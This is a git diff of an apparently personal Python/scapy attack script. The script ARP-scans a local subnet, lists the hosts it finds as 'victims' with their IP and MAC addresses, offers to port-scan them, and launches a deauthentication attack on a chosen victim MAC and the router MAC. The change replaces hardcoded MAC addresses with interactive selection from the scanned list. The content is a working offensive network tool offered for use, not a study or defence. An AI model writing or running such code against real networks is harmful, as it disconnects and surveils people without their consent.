@@ -6,7 +6,9 @@ from queue import Queue
 import time
 from scapy.all import *
 
+
 victims = []
+victims_mac= []
 target_ip = "192.168.0.1/24"
 arp = ARP(pdst=target_ip)
 ether = Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -20,6 +22,8 @@ print("IP" + " " * 18 + "MAC")
 for client in clients:
     print("{:16}    {}".format(client['ip'], client['mac']))
     victims.append(f"{client['ip']}")
+    victims_mac.append(f"{client['mac']}")
+print(victims_mac)
 
 def ren(victim):
     a = []
@@ -67,8 +71,10 @@ if port_query == "yes":
         ren(i)
 else:
     pass
-
+print(victims_mac)
 de = input("Do you wanna deauthenticate?: ").lower()
 if de == 'yes':
-    subprocess.run(["C:/Users/Cooper/PycharmProjects/Attacker/pythoncodeDeauthenticate.py", "D8:C4:6A:B6:79:5E",
-                    "2c:7e:81:87:59:08", "-c 10"], shell=True)
+    victim = int(input("Enter the index of the mac address to deauthenticate."))
+    victim_router = victims_mac[0]
+    subprocess.run(["C:/Users/Cooper/PycharmProjects/Attacker/Deauthenticate.py", victims_mac[victim],
+                    victim_router, "-c 10"], shell=True)
